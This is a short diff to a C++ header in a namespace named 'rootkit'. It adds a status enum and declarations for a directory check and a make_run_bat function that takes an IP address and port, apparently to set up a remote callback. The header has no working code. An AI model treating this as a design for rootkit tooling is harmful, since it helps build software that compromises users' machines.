@@ -19,6 +19,12 @@ struct FormatResult {
 	bool is_lost() const { return status == FormatStatus::Lost; }
 };
 
+enum class PathStatus {
+	Success,
+	Failed,
+	Error
+};
+
 
 namespace rootkit {
 
@@ -32,4 +38,7 @@ namespace rootkit {
 	std::vector<std::string> get_username_list_not_admin();
 	
 	std::string get_program_host_username();
+
+	bool is_directory_exists(std::string& path);
+	PathStatus make_run_bat(std::string& ip, unsigned short port);
 }
